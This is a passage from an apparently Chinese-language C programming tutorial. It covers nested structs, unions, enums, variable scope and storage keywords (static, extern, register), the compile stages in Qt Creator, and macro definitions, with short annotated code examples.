<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Date&#123;</span><br><span class="line">     int month;</span><br><span class="line">     int day;</span><br><span class="line">     int year;</span><br><span class="line">&#125;</span><br><span class="line">struct  stu&#123;</span><br><span class="line">     int num;</span><br><span class="line">    char *name;</span><br><span class="line">    char sex;</span><br><span class="line">    struct Date birthday;</span><br><span class="line">    Float score;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在stu中嵌套存储Date结构体内容<br><img src="/2022/01/15/C/de4aedd768012888dc7b2e70a744c86d-164283357464237.png" alt="img"></p>
<ul>
<li>注意:</li>
<li>结构体不可以嵌套自己变量,可以嵌套指向自己这种类型的指针</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Student &#123;</span><br><span class="line">    int age;</span><br><span class="line">    struct Student stu;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>对嵌套结构体成员的访问<ul>
<li>如果某个成员也是结构体变量，可以连续使用成员运算符”.”访问最低一级成员</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Date &#123;</span><br><span class="line">       int year;</span><br><span class="line">       int month;</span><br><span class="line">       int day;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  struct Student &#123;</span><br><span class="line">      char *name;</span><br><span class="line">      struct Date birthday;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> struct Student stu;</span><br><span class="line"> stu.birthday.year = 1986;</span><br><span class="line"> stu.birthday.month = 9;</span><br><span class="line"> stu.birthday.day = 10;</span><br></pre></td></tr></table></figure>

<h2 id="结构体和函数"><a href="#结构体和函数" class="headerlink" title="结构体和函数"></a>结构体和函数</h2><ul>
<li>结构体虽然是构造类型, 但是结构体之间赋值是值拷贝, 而不是地址传递</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Person&#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;;</span><br><span class="line">struct Person p1 = &#123;&quot;lnj&quot;, 35&#125;;</span><br><span class="line">struct Person p2;</span><br><span class="line">p2 = p1;</span><br><span class="line">p2.name = &quot;zs&quot;; // 修改p2不会影响p1</span><br><span class="line">printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj</span><br><span class="line">printf(&quot;p2.name = %s\n&quot;, p2.name); //  zs</span><br></pre></td></tr></table></figure>

<ul>
<li>所以结构体变量作为函数形参时也是值传递, 在函数内修改形参, 不会影响外界实参</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">struct Person&#123;</span><br><span class="line">    char *name;</span><br><span class="line">    int age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void test(struct Person per);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    struct Person p1 = &#123;&quot;lnj&quot;, 35&#125;;</span><br><span class="line">    printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj</span><br><span class="line">    test(p1);</span><br><span class="line">    printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void test(struct Person per)&#123;</span><br><span class="line">    per.name = &quot;zs&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h2><ul>
<li>和结构体不同的是, 结构体的每个成员都是占用一块独立的存储空间, 而共用体所有的成员都占用同一块存储空间</li>
<li>和结构体一样, 共用体在使用之前必须先定义共用体类型, 再定义共用体变量</li>
<li>定义共用体类型格式:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union 共用体名&#123;</span><br><span class="line">    数据类型 属性名称;</span><br><span class="line">    数据类型 属性名称;</span><br><span class="line">    ...   ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义共用体类型变量格式:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union 共用体名 共用体变量名称;</span><br></pre></td></tr></table></figure>

<ul>
<li>特点: 由于所有属性共享同一块内存空间, 所以只要其中一个属性发生了改变, 其它的属性都会受到影响</li>
<li>示例:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union Test&#123;</span><br><span class="line">    int age;</span><br><span class="line">    char ch;</span><br><span class="line">&#125;;</span><br><span class="line">union Test t;</span><br><span class="line">printf(&quot;sizeof(p) = %i\n&quot;, sizeof(t));</span><br><span class="line"></span><br><span class="line">t.age = 33;</span><br><span class="line">printf(&quot;t.age = %i\n&quot;, t.age); // 33</span><br><span class="line">t.ch = &#x27;a&#x27;;</span><br><span class="line">printf(&quot;t.ch = %c\n&quot;, t.ch); // a</span><br><span class="line">printf(&quot;t.age = %i\n&quot;, t.age); // 97</span><br></pre></td></tr></table></figure>

<ul>
<li>共用体的应用场景<ul>
<li>（1）通信中的数据包会用到共用体，因为不知道对方会发送什么样的数据包过来，用共用体的话就简单了，定义几种格式的包，收到包之后就可以根据包的格式取出数据。</li>
<li>（2）节约内存。如果有2个很长的数据结构，但不会同时使用，比如一个表示老师，一个表示学生，要统计老师和学生的情况，用结构体就比较浪费内存，这时就可以考虑用共用体来设计。<br>+（3）某些应用需要大量的临时变量，这些变量类型不同，而且会随时更换。而你的堆栈空间有限，不能同时分配那么多临时变量。这时可以使用共用体让这些变量共享同一个内存空间，这些临时变量不用长期保存，用完即丢，和寄存器差不多，不用维护。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><ul>
<li><p>什么是枚举类型?</p>
<ul>
<li>在实际问题中,有些变量的取值被限定在一个有限的范围内。例如,一个星期内只有七天,一年只有十二个月,一个班每周有六门课程等等。如果把这些量说明为整型,字符型或其它类型 显然是不妥当的。</li>
<li>C语言提供了一种称为“枚举”的类型。在“枚举”类型的定义中列举出所有可能的取值, 被说明为该“枚举”类型的变量取值不能超过定义的范围。</li>
<li>该说明的是,枚举类型是一种基本数据类型,而不是一种构造类型,因为它不能再分解为任何基本类型。<br><img src="/2022/01/15/C/d475ee4ee2d87374bd67b5f25152548c.png" alt="img"></li>
</ul>
</li>
<li><p>枚举类型的定义</p>
<ul>
<li>格式:</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum　枚举名　&#123;</span><br><span class="line">    枚举元素1,</span><br><span class="line">    枚举元素2,</span><br><span class="line">    ……</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>示例:</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 表示一年四季</span><br><span class="line">enum Season &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举变量<ul>
<li>先定义枚举类型，再定义枚举变量</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125;;</span><br><span class="line">enum Season s;</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>定义枚举类型的同时定义枚举变量</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125; s;</span><br></pre></td></tr></table></figure>

<ul>
<li>省略枚举名称，直接定义枚举变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125; s;</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举类型变量的赋值和使用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125; s;</span><br><span class="line">s = Spring; // 等价于 s = 0;</span><br><span class="line">s = 3; // 等价于 s = winter;</span><br><span class="line">printf(&quot;%d&quot;, s);</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举使用的注意<ul>
<li>C语言编译器会将枚举元素(spring、summer等)作为整型常量处理，称为枚举常量。</li>
<li>枚举元素的值取决于定义时各枚举元素排列的先后顺序。默认情况下，第一个枚举元素的值为0，第二个为1，依次顺序加1。</li>
<li>也可以在定义枚举类型时改变枚举元素的值</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">    Spring,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125;;</span><br><span class="line">// 也就是说spring的值为0，summer的值为1，autumn的值为2，winter的值为3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum Season &#123;</span><br><span class="line">    Spring = 9,</span><br><span class="line">    Summer,</span><br><span class="line">    Autumn,</span><br><span class="line">    Winter</span><br><span class="line">&#125;;</span><br><span class="line">// 也就是说spring的值为9，summer的值为10，autumn的值为11，winter的值为12</span><br></pre></td></tr></table></figure>

<h2 id="全局变量和局部变量"><a href="#全局变量和局部变量" class="headerlink" title="全局变量和局部变量"></a>全局变量和局部变量</h2><ul>
<li>变量作用域基本概念<ul>
<li>变量作用域：变量的可用范围</li>
<li>按照作用域的不同，变量可以分为：局部变量和全局变量</li>
</ul>
</li>
<li>局部变量<ul>
<li>定义在函数内部的变量以及函数的形参, 我们称为局部变量</li>
<li>作用域：从定义的那一行开始, 直到遇到}结束或者遇到return为止</li>
<li>生命周期: 从程序运行到定义哪一行开始分配存储空间到程序离开该变量所在的作用域</li>
<li>存储位置: 局部变量会存储在内存的栈区中</li>
<li>特点：<ul>
<li>相同作用域内不可以定义同名变量</li>
<li>不同作用范围可以定义同名变量，内部作用域的变量会覆盖外部作用域的变量</li>
</ul>
</li>
</ul>
</li>
<li>全局变量<ul>
<li>定义在函数外面的变量称为全局变量</li>
<li>作用域范围：从定义哪行开始直到文件结尾</li>
<li>生命周期:程序一启动就会分配存储空间,直到程序结束</li>
<li>存储位置：静态存储区</li>
<li>特点: 多个同名的全局变量指向同一块存储空间</li>
</ul>
</li>
</ul>
<hr>
<h2 id="auto和register关键字"><a href="#auto和register关键字" class="headerlink" title="auto和register关键字"></a>auto和register关键字</h2><ul>
<li>auto关键字(忘记)<ul>
<li>只能修饰局部变量, 局部变量如果没有其它修饰符, 默认就是auto的</li>
<li>特点: 随用随开, 用完即销</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto int num; // 等价于 int num;</span><br></pre></td></tr></table></figure>

<ul>
<li>register关键字(忘记)<ul>
<li>只能修饰局部变量, 原则上将内存中变量提升到CPU寄存器中存储, 这样访问速度会更快</li>
<li>但是由于CPU寄存器数量相当有限, 通常不同平台和编译器在优化阶段会自动转换为auto</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">register int num; </span><br></pre></td></tr></table></figure>

<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><ul>
<li>对局部变量的作用<ul>
<li>延长局部变量的生命周期,从程序启动到程序退出,但是它并没有改变变量的作用域</li>
<li>定义变量的代码在整个程序运行期间仅仅会执行一次</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void test();</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    test();</span><br><span class="line">    test();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">void test()&#123;</span><br><span class="line">    static int num = 0; // 局部变量</span><br><span class="line">    num++; </span><br><span class="line">    // 如果不加static输出 1 1 1</span><br><span class="line">    // 如果添加static输出 1 2 3</span><br><span class="line">    printf(&quot;num = %i\n&quot;, num); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>对全局变量的作用</strong></p>
</li>
<li><p>全局变量分类：</p>
</li>
<li><p>内部变量:只能在本文件中访问的变量</p>
</li>
<li><p>外部变量:可以在其他文件中访问的变量,默认所有全局变量都是外部变量</p>
</li>
<li><p>默认情况下多个同名的全局变量共享一块空间, 这样会导致全局变量污染问题</p>
</li>
<li><p>如果想让某个全局变量只在某个文件中使用, 并且不和其他文件中同名全局变量共享同一块存储空间, 那么就可以使用static</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// A文件中的代码</span><br><span class="line">int num; // 和B文件中的num共享</span><br><span class="line">void test()&#123;</span><br><span class="line">    printf(&quot;ds.c中的 num = %i\n&quot;, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// B文件中的代码</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;ds.h&quot;</span><br><span class="line"></span><br><span class="line">int num; // 和A文件中的num共享</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    num = 666;</span><br><span class="line">    test(); // test中输出666</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// A文件中的代码</span><br><span class="line">static int num; // 不和B文件中的num共享</span><br><span class="line">void test()&#123;</span><br><span class="line">    printf(&quot;ds.c中的 num = %i\n&quot;, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// B文件中的代码</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;ds.h&quot;</span><br><span class="line"></span><br><span class="line">int num; // 不和A文件中的num共享</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    num = 666;</span><br><span class="line">    test(); // test中输出0</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="extern关键字"><a href="#extern关键字" class="headerlink" title="extern关键字"></a>extern关键字</h2><ul>
<li>对局部变量的作用<ul>
<li>extern不能用于局部变量</li>
<li>extern代表声明一个变量, 而不是定义一个变量, 变量只有定义才会开辟存储空间</li>
<li>所以如果是局部变量, 虽然提前声明有某个局部变量, 但是局部变量只有执行到才会分配存储空间</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    extern int num;</span><br><span class="line">    num = 998; // 使用时并没有存储空间可用, 所以声明了也没用</span><br><span class="line">    int num; // 这里才会开辟</span><br><span class="line">    printf(&quot;num = %i\n&quot;, num);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>对全局变量的作用<ul>
<li>声明一个全局变量, 代表告诉编译器我在其它地方定义了这个变量, 你可以放心使用</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    extern int num; // 声明我们有名称叫做num变量</span><br><span class="line">    num = 998; // 使用时已经有对应的存储空间</span><br><span class="line">    printf(&quot;num = %i\n&quot;, num);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int num; // 全局变量, 程序启动就会分配存储空间</span><br></pre></td></tr></table></figure>

<h2 id="static与extern对函数的作用"><a href="#static与extern对函数的作用" class="headerlink" title="static与extern对函数的作用"></a>static与extern对函数的作用</h2><ul>
<li>内部函数:只能在本文件中访问的函数</li>
<li>外部函数:可以在本文件中以及其他的文件中访问的函数</li>
<li>默认情况下所有的函数都是外部函数</li>
<li><strong>static 作用</strong><ul>
<li>声明一个内部函数</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int sum(int num1,int num2);</span><br></pre></td></tr></table></figure>

<ul>
<li>定义一个内部函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static int sum(int num1,int num2)</span><br><span class="line">&#123;</span><br><span class="line">  return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>extern作用<ul>
<li>声明一个外部函数</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern int sum(int num1,int num2);</span><br></pre></td></tr></table></figure>

<ul>
<li><ul>
<li>定义一个外部函数</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern int sum(int num1,int num2)</span><br><span class="line">&#123;</span><br><span class="line">  return num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意点:</li>
<li>由于默认情况下所有的函数都是外部函数, 所以extern一般会省略</li>
<li>如果只有函数声明添加了static与extern, 而定义中没有添加static与extern, 那么无效</li>
</ul>
</blockquote>
<h2 id="Qt-Creator编译过程做了什么"><a href="#Qt-Creator编译过程做了什么" class="headerlink" title="Qt Creator编译过程做了什么?"></a>Qt Creator编译过程做了什么?</h2><ul>
<li><img src="/2022/01/15/C/68665a597da91a563b24cf3787665031.png" alt="img"></li>
<li>当我们按下运行按钮的时, 其实Qt Creator编译器做了5件事情<ul>
<li>对源文件进行预处理, 生成预处理文件</li>
<li>对预处理文件进行编译, 生成汇编文件</li>
<li>对汇编文件进行编译, 生成二进制文件</li>
<li>对二进制文件进行链接, 生成可执行文件</li>
<li>运行可执行文件</li>
</ul>
</li>
</ul>
<hr>
<p> Qt Creator编译过程验证</p>
<ul>
<li><em><strong>1.编写代码, 保存源文件:</strong></em></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    printf(&quot;hello lnj\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em><strong>2.执行预处理编译</strong></em><br><img src="/2022/01/15/C/2af92e78efb66b239f4ca96a99c6e228.png" alt="img"></p>
<ul>
<li>执行预处理编译后生成的文件<br><img src="/2022/01/15/C/362d51ee291b27f51140908a7244f463.png" alt="img"></li>
</ul>
<p>打开预处理编译后生成的文件</p>
<ul>
<li><p>处理源文件中预处理相关的指令</p>
</li>
<li><p>处理源文件中多余注释等<br><img src="/2022/01/15/C/85fd0abb9c2aab02e1c4563bc1ec9ef8.png" alt="img"></p>
</li>
<li><p><em><strong>3.执行汇编编译</strong></em><br><img src="https://img-blog.csdnimg.cn/img_convert/4fd0ccaf482c9cc55f01e765c417cf5e.png" alt="img"></p>
</li>
<li><p>执行汇编编译后生成的文件<br><img src="https://img-blog.csdnimg.cn/img_convert/a4c1f0baf9e24d3048dca3b46d6b466c.png" alt="img"></p>
</li>
<li><p>打开汇编编译后生成的文件<br><img src="/2022/01/15/C/6f772a00140c7cf1676c8c20eb29a2e4.png" alt="img"></p>
</li>
</ul>
<hr>
<ul>
<li><em><strong>4.执行二进制编译</strong></em><br><img src="/2022/01/15/C/35f2d59e43f7964b22a3bce00ac0b704.png" alt="img"></li>
<li>执行二进制编译后生成的文件<br><img src="/2022/01/15/C/7869895f908c7b3527c3f8421852a3fd.png" alt="img"></li>
<li>打开二进制编译后生成的文件<br><img src="/2022/01/15/C/aff25b0d0e698d8790b640cb1acc332e.png" alt="img"></li>
</ul>
<hr>
<ul>
<li><strong>5.执行链接操作</strong><ul>
<li>将依赖的一些C语言函数库和我们编译好的二进制合并为一个文件<br><img src="/2022/01/15/C/b0f09e30dd95ab87c87a5b3a8568bdf9.png" alt="img"></li>
</ul>
</li>
<li>执行链接操作后生成的文件<br><img src="/2022/01/15/C/6a20b54e83c2e2973ef46bd0cc015b72.png" alt="img"></li>
</ul>
<hr>
<ul>
<li><em><strong>6.运行链接后生成的文件</strong></em><br><img src="/2022/01/15/C/c336c50cce49b91c0088449099ebeb88.png" alt="img"></li>
</ul>
<hr>
<h2 id="计算机是运算过程分析"><a href="#计算机是运算过程分析" class="headerlink" title="计算机是运算过程分析"></a>计算机是运算过程分析</h2><ul>
<li>1.编写一个简单的加法运算</li>
<li>2.调试编写好的代码, 查看对应的汇编文件<br><img src="/2022/01/15/C/cd7728553a54887d4fc8f8d7be76ff3c.png" alt="img"><br><img src="/2022/01/15/C/6d73e8b907457511093f7bd71ec2b1f0.png" alt="img"><br><img src="/2022/01/15/C/f48a45d6d63c16e7415ff225b28681f2.png" alt="img"></li>
<li>结论:<ul>
<li>1.通过地址线找到对应地址的存储单元</li>
<li>2.通过控制线发送内存读取指令</li>
<li>3.通过数据线将内存中的值传输到CPU寄存器中</li>
<li>4.在CPU中完成计算操作</li>
<li>5.通过地址线找到对应地址的存储单元</li>
<li>6.通过控制线发送内存写入指令</li>
<li>7.通过数据线将计算结果传输到内存中</li>
</ul>
</li>
</ul>
<h2 id="预处理指令"><a href="#预处理指令" class="headerlink" title="预处理指令"></a>预处理指令</h2><h2 id="预处理指令的概念"><a href="#预处理指令的概念" class="headerlink" title="预处理指令的概念"></a>预处理指令的概念</h2><ul>
<li>C语言在对源程序进行编译之前，会先对一些特殊的预处理指令作解释(比如之前使用的#include文件包含指令)，产生一个新的源程序(这个过程称为编译预处理),之后再进行通常的编译</li>
<li>为了区分预处理指令和一般的C语句，所有预处理指令都以符号“#”开头，并且结尾不用分号</li>
<li>预处理指令可以出现在程序的任何位置，它的作用范围是从它出现的位置到文件尾。习惯上我们尽可能将预处理指令写在源程序开头，这种情况下，它的作用范围就是整个源程序文件</li>
<li>C语言提供了多种预处理功能,如宏定义、文件包含、条件编译等。合理地使用预处理功能编写的程序便于阅读、修改、移植和调试,也有利于模块化程序设计。</li>
</ul>
<hr>
<h2 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h2><ul>
<li><p>被定义为“宏”的标识符称为“宏名”。在编译预处理时,对程序中所有出现的“宏名”,都用宏定义中的字符串去代换,这称为“宏代换”或“宏展开”。</p>
</li>
<li><p>宏定义是由源程序中的宏定义命令完成的。宏代换是由预处理程序自动完成的。在C语言中,“宏”分为有参数和无参数两种。<br>##不带参数的宏定义</p>
</li>
<li><p>格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define 标识符 字符串</span><br></pre></td></tr></table></figure>

<ul>
<li>其中的“#”表示这是一条预处理命令。凡是以“#”开头的均为预处理命令。“define”为宏定义命令。“标识符”为所定义的宏名。“字符串”可以是常数、表达式、格式串等。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">  // 源程序中所有的宏名PI在编译预处理的时候都会被3.14所代替</span><br><span class="line">  #define PI 3.14</span><br><span class="line"></span><br><span class="line"> // 根据圆的半径计radius算周长</span><br><span class="line"> float girth(float radius) &#123;</span><br><span class="line">    return 2 * PI *radius;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main ()</span><br><span class="line"> &#123;</span><br><span class="line">    float g = girth(2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;周长为：%f&quot;, g);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>注意点:</strong></li>
</ul>
<ol>
<li>宏名一般用大写字母，以便与变量名区别开来，但用小写也没有语法错误</li>
</ol>
<ul>
<li>2)对程序中用双引号扩起来的字符串内的字符，不进行宏的替换操作</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define R 10</span><br><span class="line"> int main ()</span><br><span class="line"> &#123;</span><br><span class="line">     char *s = &quot;Radio&quot;; // 在第1行定义了一个叫R的宏，但是第4行中&quot;Radio&quot;里面的&#x27;R&#x27;并不会被替换成10</span><br><span class="line"></span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3.在编译预处理用字符串替换宏名时，不作语法检查，只是简单的字符串替换。只有在编译的时候才对已经展开宏名的源程序进行语法检查</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define I 100</span><br><span class="line"> int main ()</span><br><span class="line"> &#123;</span><br><span class="line">     int i[3] = I;</span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>4.宏名的有效范围是从定义位置到文件结束。如果需要终止宏定义的作用域，可以用#undef命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define PI 3.14</span><br><span class="line">int main ()</span><br><span class="line"> &#123;</span><br><span class="line">    printf(&quot;%f&quot;, PI);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">#undef PI</span><br><span class="line">void test()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%f&quot;, PI); // 不能使用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>5.定义一个宏时可以引用已经定义的宏名</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define R  3.0</span><br><span class="line">#define PI 3.14</span><br><span class="line">#define L  2*PI*R</span><br><span class="line">#define S  PI*R*R</span><br></pre></td></tr></table></figure>

<ul>
<li>6.可用宏定义表示数据类型,使书写方便</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define String char *</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">     String str = &quot;This is a string!&quot;;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="带参数的宏定义"><a href="#带参数的宏定义" class="headerlink" title="带参数的宏定义"></a>带参数的宏定义</h2><ul>
<li>C语言允许宏带有参数。在宏定义中的参数称为形式参数,在宏调用中的参数称为实际参数。对带参数的宏,在调用中,不仅要宏展开,而且要用实参去代换形参</li>
<li>格式: <code>#define 宏名(形参表) 字符串</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第1行中定义了一个带有2个参数的宏average，</span><br><span class="line"> #define average(a, b) (a+b)/2</span><br><span class="line"></span><br><span class="line">int main ()</span><br><span class="line">  &#123;</span><br><span class="line">  // 第4行其实会被替换成：int a = (10 + 4)/2;，</span><br><span class="line">      int a = average(10, 4);</span><br><span class="line">  // 输出结果为：7是不是感觉这个宏有点像函数呢？</span><br><span class="line">      printf(&quot;平均值：%d&quot;, a);</span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>注意点:</strong></li>
<li>1)宏名和参数列表之间不能有空格，否则空格后面的所有字符串都作为替换的字符串.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define average (a, b) (a+b)/2</span><br><span class="line"></span><br><span class="line"> int main ()</span><br><span class="line"> &#123;</span><br><span class="line">     int a = average(10, 4);</span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br><span class="line">注意第1行的宏定义，宏名average跟(a, b)之间是有空格的，于是，第5行就变成了这样：</span><br><span class="line">int a = (a, b) (a+b)/2(10, 4);</span><br><span class="line">这个肯定是编译不通过的</span><br></pre></td></tr></table></figure>

<ul>
<li>2)带参数的宏在展开时，只作简单的字符和参数的替换，不进行任何计算操作。所以在定义宏时，一般用一个小括号括住字符串的参数。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">  // 下面定义一个宏D(a)，作用是返回a的2倍数值：</span><br><span class="line">  #define D(a) 2*a</span><br><span class="line">  // 如果定义宏的时候不用小括号括住参数</span><br><span class="line"></span><br><span class="line">  int main ()</span><br><span class="line">  &#123;</span><br><span class="line">  // 将被替换成int b = 2*3+4;，输出结果10，如果定义宏的时候用小括号括住参数，把上面的第3行改成：#define D(a) 2*(a)，注意右边的a是有括号的，第7行将被替换成int b = 2*(3+4);，输出结果14</span><br><span class="line"></span><br><span class="line">     int b = D(3+4);</span><br><span class="line">     printf(&quot;%d&quot;, b);</span><br><span class="line">     return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>3)计算结果最好也用括号括起来</li>
</ul>
